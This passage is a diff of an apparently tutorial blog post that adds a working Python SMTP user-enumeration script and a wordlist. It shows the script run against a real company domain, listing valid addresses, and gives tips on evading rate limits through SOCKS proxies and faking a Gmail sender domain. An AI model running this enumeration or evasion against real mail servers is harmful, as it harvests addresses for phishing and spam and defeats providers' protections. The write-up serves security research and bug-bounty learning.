@@ -127,6 +127,7 @@ Now let's try doing the same step in Python REPL with [dnspython](https://www.dn
 <DNS IN MX rdata: 1 aspmx.l.google.com.>
 >>> str(answers[0].exchange)
 'aspmx.l.google.com.'
+>>> smtp_hostname = str(answers[0].exchange)
 >>> conn = smtplib.SMTP(smtp_hostname)
 >>> conn.helo('test.example.org')
 (250, b'mx.google.com at your service')
@@ -146,5 +147,124 @@ Now let's try doing the same step in Python REPL with [dnspython](https://www.dn
 (221, b'2.0.0 closing connection u30-20020ac25bde000000b00449fff281b7si4479810lfn.313 - gsmtp')
 ```
 
+A simple Python script that takes a wordlist and domain via CLI arguments to enumerate SMTP users at given domain:
+
+```python
+#!/usr/bin/python3
+
+import smtplib
+import sys
+
+import dns.resolver  # requires dnspython
+
+
+def make_smtp_conn(smtp_hostname):
+    conn = smtplib.SMTP(smtp_hostname)
+
+    conn.helo("gmail.com")
+    conn.mail("FROM: <a@gmail.com>")
+
+    return conn
+
+
+def main():
+    if len(sys.argv) != 3:
+        print("Usage:")
+        print("{} <wordlist> <domain>".format(sys.argv[0]))
+        return
+
+    domain = sys.argv[-1]
+
+    answers = dns.resolver.resolve(domain, "MX")
+
+    if len(answers) == 0:
+        print("Error: no MX records found for {}".format(domain))
+        return -1
+
+    in_f = open(sys.argv[1], "r")
+
+    smtp_hostname = str(answers[0].exchange)
+
+    conn = make_smtp_conn(smtp_hostname)
+
+    n = 0
+
+    for line in in_f:
+        line = line.strip()
+
+        email_addr = line + "@" + domain
+
+        status, _ = conn.rcpt(email_addr)
+        if status == 250:
+            print(email_addr)
+
+        n += 1
+        if n % 99 == 0:
+            conn.quit()
+            conn = make_smtp_conn(smtp_hostname)
+
+    conn.quit()
+
+
+if __name__ == "__main__":
+    main()
+
+```
+
+Let us create a very basic wordlist with some entries from RFC 2142 and other common words found in email addresses:
+
+```
+abuse
+noc
+security
+postmaster
+hostmaster
+usenet
+news
+webmaster
+www
+uucp
+ftp
+support
+info
+sales
+```
+
+Running the above script with this wordlist on peopledatalabs.com domain prints the following valid email addresses
+to standard output:
+
+```
+$ python3 smtp_enum.py basic_wordlist.txt peopledatalabs.com
+abuse@peopledatalabs.com
+security@peopledatalabs.com
+postmaster@peopledatalabs.com
+support@peopledatalabs.com
+sales@peopledatalabs.com
+```
+
+If we wish to be more serious about enumerating a significant portion of email addresses at any given domain we need
+to take a proper care and acquire or generate a proper wordlist. Quality of the wordlist largely makes or breaks
+the success of SMTP user enumeration. If you know that email addresses at certain company follow a certain pattern and
+are based on names and surnames of employees (e.g. `john.smith@example.org`) you would want to generate your wordlist
+based on this pattern. You may also want to look into public wordlists (e.g. from [danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
+repo to use them as starting point for creating your own.
+
+Furthermore, email providers do have some countermeasures against SMTP enumeration. For example, I found that Google
+starts reporting all email addresses as non-existent if the above script launches bunch of checks repeatedly from single
+IP address in a short timeframe - probably due to triggerring some rate limits. This
+should be addressable by introducing delays into code (SMTP connection may need to be re-established) or by spreading
+the traffic across multiple connections tunneled through SOCKS proxies. I would not recommend doing this sort of 
+shenanigans at non-trivial scale from home IP adddress. Some email providers also reject the SMTP
+transaction if source domain address is weird (e.g. example.org). This can be fixed by simply using a domain with a
+popular email service in HELO and MAIL messages in the beginning.
+
+What are the possible applications of SMTP user enumeration? Growth hackers can use it to source email addresses for
+cold outreach or ad targeting. OSINT investigators can use it to cover more ground in research. Penetration testers
+and social engineers can leverage email list gathered via SMTP enumeration for further attacks. When it comes to bug
+bounties, SMTP username enumeration is generally not considered to be a vulnerability by itself as RCPT method
+cannot truly be prevented due to RCPT request being an integral part of a regular email sending flow, but one could
+argue that it's a security problem if it is too easy to perform. For example, someone received $300
+bounty for reporting that VRFY method is possible on a certain server, besides other problems with SMTP (see
+HackerOne report [#138315](https://hackerone.com/reports/138315)).
 
 
